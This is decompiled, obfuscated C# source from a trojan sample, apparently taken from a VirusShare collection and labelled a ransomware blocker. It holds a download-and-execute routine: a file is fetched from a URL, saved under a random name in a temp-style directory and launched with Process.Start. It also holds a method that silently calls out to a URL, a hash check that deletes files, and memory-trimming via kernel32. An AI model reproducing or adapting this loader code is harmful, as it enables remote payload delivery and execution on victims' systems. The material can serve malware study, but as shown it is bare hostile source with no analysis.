// Decompiled with JetBrains decompiler
// Type: .
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-fa05b3c64ba6163bb64b30062883b6f46b0f1c15f6c74963ec9341db78f63ddb.exe

using \u0001\u000E\u0003\u0004;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0001\u000E\u0003\u0004
{
  internal class \u000C\u000E
  {
    private static Random \u0010\u0002 = new Random();

    public static string \u0010\u0007(string _param0) => BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(Encoding.Default.GetBytes(_param0))).Replace(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0004\u0008\u000F\u0005(), \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000E\u0007\u0003\u0010\u0001()).ToUpper();

    private static string \u0004\u0009\u0006(string _param0)
    {
      FileStream inputStream = System.IO.File.OpenRead(_param0);
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash((Stream) inputStream);
      inputStream.Close();
      return BitConverter.ToString(hash).Replace(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0004\u0008\u000F\u0005(), \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000E\u0007\u0003\u0010\u0001()).ToUpper();
    }

    public static bool \u0024MD\u002422(string _param0)
    {
      if (!System.IO.File.Exists(_param0))
        return false;
      if (!(\u000C\u000E.\u0004\u0009\u0006(_param0) != \u000C\u000E.\u0004\u0009\u0006(\u000B\u0005\u0006\u000D\u0002\u0008.\u000D\u0007\u0010\u0011\u000D\u0008)))
        return true;
      System.IO.File.Delete(_param0);
      return false;
    }

    private static string \u0006\u0006\u000A(int _param0)
    {
      string str = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0006\u0009\u0001\u000E\u0001\u0002();
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < _param0; ++index)
        stringBuilder.Append(str.Substring(\u000C\u000E.\u0010\u0002.Next(0, str.Length), 1));
      return stringBuilder.ToString();
    }

    public static void \u000E\u0006\u000E\u0008(string _param0)
    {
      try
      {
        if (!_param0.StartsWith(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000B\u0010\u000C\u0001()))
          _param0 = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000B\u0010\u000C\u0001() + _param0;
        WebClient webClient = new WebClient();
        webClient.OpenRead(_param0);
        webClient.Dispose();
      }
      catch
      {
      }
    }

    public static void \u000B\u0006\u000D\u000F(string _param0)
    {
      try
      {
        if (!_param0.StartsWith(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000B\u0010\u000C\u0001()))
          _param0 = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000B\u0010\u000C\u0001() + _param0;
        WebClient webClient = new WebClient();
        string lower = _param0.Substring(_param0.LastIndexOf('.')).ToLower();
        string fileName = Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0005\u0003()) + \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0003\u0005() + \u000C\u000E.\u0006\u0006\u000A(\u000C\u000E.\u0010\u0002.Next(5, 12)) + lower;
        webClient.DownloadFile(_param0, fileName);
        webClient.Dispose();
        Process.Start(fileName);
      }
      catch
      {
      }
    }

    public static void \u0009\u000C\u0004()
    {
      GC.Collect();
      GC.WaitForPendingFinalizers();
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        return;
      \u000C\u000E.\u0003\u0010\u000A\u0001(Process.GetCurrentProcess().Handle, -1, -1);
    }

    [DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize")]
    private static extern int \u0003\u0010\u000A\u0001(IntPtr _param0, int _param1, int _param2);
  }
}
